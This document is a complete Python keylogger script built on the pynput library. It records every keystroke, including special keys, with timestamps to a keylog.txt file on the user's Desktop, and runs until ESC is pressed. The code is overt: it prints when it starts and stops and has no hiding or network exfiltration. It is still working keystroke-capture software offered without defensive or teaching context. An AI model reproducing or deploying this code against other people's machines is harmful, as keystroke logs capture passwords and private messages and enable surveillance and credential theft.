import os
import logging
from datetime import datetime
from pynput import keyboard

# Define the log file path (Desktop/keylog.txt)
log_dir = os.path.expanduser('~/Desktop')
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file = os.path.join(log_dir, "keylog.txt")

# Configure logging
logging.basicConfig(filename=log_file,
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

class Keylogger:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.is_running = False

    def on_press(self, key):
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            # Special keys (e.g., space, enter, esc)
            logging.info(f"Special key pressed: {key}")

        # Stop listener on ESC key
        if key == keyboard.Key.esc:
            self.stop()

    def start(self):
        self.is_running = True
        print(f"Keylogger started. Logging to {log_file}")
        with self.listener:
            self.listener.join()

    def stop(self):
        self.is_running = False
        print("Keylogger stopped.")
        self.listener.stop()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
